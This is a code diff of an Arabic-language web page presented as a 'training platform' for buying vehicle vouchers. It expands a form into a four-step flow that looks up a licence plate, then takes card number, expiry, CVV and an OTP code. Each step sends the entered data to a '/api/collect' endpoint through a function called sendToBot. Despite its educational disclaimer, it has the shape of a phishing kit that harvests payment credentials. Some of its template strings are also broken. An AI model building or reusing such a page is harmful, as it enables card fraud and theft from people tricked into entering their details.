@@ -1,40 +1,261 @@
 <!DOCTYPE html>
-<html>
+<html dir="rtl" lang="ar">
 <head>
-    <title>منصة تدريبية</title>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>منصة تدريبية - شراء القسائم</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #0055a4 0%, #004080 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        .warning {
+            background: #ffeb3b;
+            color: #d32f2f;
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+            margin-bottom: 20px;
+            font-weight: bold;
+            border: 2px solid #d32f2f;
+        }
+        .card {
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            margin-bottom: 20px;
+        }
+        .step {
+            background: #004080;
+            color: white;
+            padding: 10px;
+            border-radius: 10px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        input, select {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            font-size: 16px;
+            font-family: monospace;
+        }
+        button {
+            width: 100%;
+            padding: 15px;
+            background: #28a745;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        button:hover { background: #218838; }
+        button.secondary {
+            background: #6c757d;
+            margin-top: 10px;
+        }
+        .info {
+            background: #e3f2fd;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 15px 0;
+            text-align: center;
+        }
+        .hidden { display: none; }
+        .otp-box {
+            background: #fff3cd;
+            text-align: center;
+            font-size: 32px;
+            letter-spacing: 8px;
+            font-weight: bold;
+            font-family: monospace;
+            padding: 20px;
+            border-radius: 10px;
+            border: 2px dashed #ff9800;
+        }
+    </style>
 </head>
 <body>
-    <h1>منصة تدريب شراء القسائم</h1>
-    <p style="color:red; background:yellow;">⚠️ تنبيه: هذه منصة تدريبية لأغراض إعلامية فقط، لا تمثل أي جهة رسمية</p>
-    
-    <label>الماركة:</label>
-    <input type="text" id="marque" placeholder="مثال: رونو"><br>
-    <label>السنة:</label>
-    <input type="text" id="annee" placeholder="مثال: 2020"><br>
-    <label>الموديل:</label>
-    <input type="text" id="modele" placeholder="مثال: سيمبول"><br>
-    <label>رقم اللوحة:</label>
-    <input type="text" id="plaque" placeholder="مثال: 1234 ع 99"><br>
-    <button id="confirmBtn">تأكيد وإرسال</button>
-    
-    <script>
-        document.getElementById('confirmBtn').onclick = async () => {
-            const data = {
-                marque: document.getElementById('marque').value,
-                annee: document.getElementById('annee').value,
-                modele: document.getElementById('modele').value,
-                plaque: document.getElementById('plaque').value
-            };
-            
+<div class="container">
+    <div class="warning">
+        ⚠️ تنبيه هام: هذه المنصة تدريبية لأغراض إعلامية فقط<br>
+        ⚠️ Avertissement: Plateforme éducative uniquement - aucune transaction réelle
+    </div>
+
+    <!-- الخطوة 1: إدخال رقم السيارة -->
+    <div id="step1" class="card">
+        <div class="step">الخطوة 1: إدخال رقم التسجيل</div>
+        <label>رقم تسجيل المركبة:</label>
+        <input type="text" id="plaque" placeholder="مثال: 1234 ع 99" dir="ltr">
+        <button onclick="searchCar()">بحث</button>
+        <div class="info" style="background:#f8f9fa; font-size:12px;">
+            أرقام تجريبية: 1234 ع 99 | 5678 و 22 | 9101 ب 33 | 1112 ج 44
+        </div>
+    </div>
+
+    <!-- الخطوة 2: معلومات السيارة -->
+    <div id="step2" class="card hidden">
+        <div class="step">الخطوة 2: تأكيد معلومات المركبة</div>
+        <div id="carInfo" class="info"></div>
+        <button onclick="goToPayment()">تأكيد والمتابعة للدفع</button>
+        <button class="secondary" onclick="reset()">رجوع</button>
+    </div>
+
+    <!-- الخطوة 3: إدخال بيانات البطاقة -->
+    <div id="step3" class="card hidden">
+        <div class="step">الخطوة 3: إدخال بيانات البطاقة الذهبية (تدريبي)</div>
+        <label>رقم البطاقة (16 رقم):</label>
+        <input type="text" id="cardNumber" maxlength="16" placeholder="1234 5678 9012 3456" dir="ltr">
+        <label>تاريخ الانتهاء (MM/YY):</label>
+        <input type="text" id="expiry" maxlength="5" placeholder="12/25" dir="ltr">
+        <label>الرمز السري (CVV):</label>
+        <input type="password" id="cvv" maxlength="3" placeholder="123" dir="ltr">
+        <button onclick="sendPayment()">دفع (تدريبي)</button>
+        <button class="secondary" onclick="reset()">رجوع</button>
+    </div>
+
+    <!-- الخطوة 4: إدخال OTP (المرحلة الأخيرة) -->
+    <div id="step4" class="card hidden">
+        <div class="step">الخطوة 4: إدخال رمز التحقق OTP</div>
+        <div id="otpDisplay" class="otp-box"></div>
+        <label>أدخل الرقم الذي يظهر أعلاه:</label>
+        <input type="text" id="otpCode" maxlength="6" placeholder="أدخل الرقم" dir="ltr">
+        <button onclick="verifyOtp()">تأكيد وإنهاء</button>
+        <button class="secondary" onclick="reset()">رجوع</button>
+        <div class="info" style="margin-top:15px; background:#d4edda;">
+            ✅ بعد إدخال الرقم الصحيح، سيتم إرسال إشعار إلى البوت وسيتم إنهاء التدريب.
+        </div>
+    </div>
+</div>
+
+<script>
+    let currentCar = null;
+    let generatedOtp = null;
+
+    async function sendToBot(step, data) {
+        try {
             await fetch('/api/collect', {
                 method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(data)
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ step, data })
             });
-            
-            alert('تم إرسال البيانات إلى البوت (تدريبي)');
-        };
-    </script>
+        } catch(e) { console.log('خطأ في الإرسال للبوت'); }
+    }
+
+    async function searchCar() {
+        const plaque = document.getElementById('plaque').value.trim();
+        if (!plaque) { alert('الرجاء إدخال رقم السيارة'); return; }
+        
+        const res = await fetch('/api/search-car', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ plaque })
+        });
+        const data = await res.json();
+        
+        if (!data.found) {
+            alert('لم يتم العثور على السيارة. استخدم الأرقام التجريبية الظاهرة أسفل الحقل');
+            return;
+        }
+        
+        currentCar = data;
+        
+        document.getElementById('carInfo').innerHTML = 
+            ✅ تم العثور على المركبة:<br>
+            🚗 الماركة: ${data.marque}<br>
+            🚙 الموديل: ${data.modele}<br>
+            📅 السنة: ${data.annee}<br>
+            🏷️ رقم التسجيل: ${data.plaque}
+        ;
+        
+        await sendToBot('search_car', { 
+            plaque: data.plaque, 
+            marque: data.marque, 
+            modele: data.modele, 
+            annee: data.annee 
+        });
+        
+        showStep(2);
+    }
+
+    function goToPayment() {
+        showStep(3);
+    }
+
+    async function sendPayment() {
+        const cardNumber = document.getElementById('cardNumber').value.trim();
+        const expiry = document.getElementById('expiry').value.trim();
+        const cvv = document.getElementById('cvv').value.trim();
+        
+        if (!cardNumber || cardNumber.length < 16) {
+            alert('الرجاء إدخال رقم بطاقة مكون من 16 رقم');
+            return;
+        }
+        if (!expiry || expiry.length < 5) {
+            alert('الرجاء إدخال تاريخ انتهاء صحيح (MM/YY)');
+            return;
+        }
+        if (!cvv || cvv.length < 3) {
+            alert('الرجاء إدخال الرمز السري المكون من 3 أرقام');
+            return;
+        }
+        
+        // توليد OTP عشوائي للتدريب
+        generatedOtp = Math.floor(100000 + Math.random() * 900000).toString();
+        document.getElementById('otpDisplay').innerHTML = generatedOtp;
+        
+        await sendToBot('payment', {
+            cardNumber: cardNumber,
+            expiry: expiry,
+            cvv: cvv,
+            amount: 2000
+        });
+        
+        showStep(4);
+    }
+
+    async function verifyOtp() {
+        const enteredCode = document.getElementById('otpCode').value.trim();
+        if (enteredCode === generatedOtp) {
+            await sendToBot('otp', { code: enteredCode, success: true });
+            alert('✅ تمت العملية التدريبية بنجاح! شكراً لك.\n(هذه محاكاة تدريبية فقط)');
+            reset();
+        } else {
+            alert('❌ الرقم غير صحيح. حاول مرة أخرى');
+        }
+    }
+
+    function showStep(step) {
+        document.getElementById('step1').classList.add('hidden');
+        document.getElementById('step2').classList.add('hidden');
+        document.getElementById('step3').classList.add('hidden');
+        document.getElementById('step4').classList.add('hidden');
+        
+        document.getElementById(step${step}).classList.remove('hidden');
+    }
+
+    function reset() {
+        currentCar = null;
+        generatedOtp = null;
+        document.getElementById('plaque').value = '';
+        document.getElementById('cardNumber').value = '';
+        document.getElementById('expiry').value = '';
+        document.getElementById('cvv').value = '';
+        document.getElementById('otpCode').value = '';
+        showStep(1);
+    }
+</script>
 </body>
 </html>
